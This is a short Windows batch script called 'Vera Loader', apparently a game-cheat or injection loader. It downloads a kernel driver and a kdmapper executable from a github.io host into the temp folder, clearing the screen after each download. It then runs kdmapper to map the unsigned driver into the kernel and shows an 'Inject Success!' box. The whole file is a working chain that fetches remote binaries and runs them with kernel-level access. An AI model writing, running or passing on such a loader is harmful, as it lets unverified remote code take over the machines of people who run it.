@echo off
cd %temp%
curl -o driver1.sys https://getserver.github.io/api/keysys/driver.sys
cls
curl -o inject1.exe https://getserver.github.io/api/keysys/kdmapper_Release.exe
cls

"inject1.exe" "driver1.sys"

set VBScriptFile=temp.vbs

(
  echo MsgBox "Inject Success!", vbInformation, "Vera Loader"
) > %VBScriptFile%

cscript //nologo %VBScriptFile%
del %VBScriptFile%
exit

